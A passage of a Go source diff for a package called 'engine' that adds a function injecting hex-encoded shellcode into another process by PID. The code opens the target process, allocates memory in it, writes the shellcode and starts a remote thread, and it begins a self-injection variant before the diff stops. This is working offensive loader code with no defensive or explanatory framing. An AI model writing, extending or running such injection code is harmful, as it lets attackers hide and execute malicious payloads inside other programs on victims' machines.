@@ -5,6 +5,7 @@ package engine
 import (
 	"encoding/hex"
 	"errors"
+	"os"
 	"syscall"
 	"unsafe"
 )
@@ -39,6 +40,34 @@ func allocate(size uintptr) (uintptr, error) {
 }
 
 func InjectIntoProc(shellcode string, pid int64) error {
+	sc, err := hex.DecodeString(shellcode)
+	if err != nil {
+		return errors.New("conversion from hex-encoded string failed")
+	}
+
+	scAddr, err := allocate(uintptr(len(sc)))
+	if err != nil {
+		return err
+	}
+
+	addrPtr := (*[990000]byte)(unsafe.Pointer(scAddr))
+	for scIdx, scByte := range sc {
+		addrPtr[scIdx] = scByte
+	}
+
+	remoteProc, _, _ := openProc.Call(wpc|wpq|wpo|wpw|wpr, uintptr(zero), uintptr(pid))
+	remoteMem, _, _ := allocExMem.Call(remoteProc, uintptr(zero), uintptr(len(sc)), wmr|wmc, wam)
+	writeProc.Call(remoteProc, remoteMem, scAddr, uintptr(len(sc)), uintptr(zero))
+	status, _, _ := createThread.Call(remoteProc, uintptr(zero), 0, remoteMem, uintptr(zero), 0, uintptr(zero))
+	if status != 0 {
+		return nil
+	}
+
+	return errors.New("could not inject into given process")
+}
+
+func InjectIntoSelf(shellcode string) error {
+	pid := os.Getpid()
 	sc, err := hex.DecodeString(shellcode)
 	if err != nil {
 		return errors.New("conversion from hex-encoded string failed")
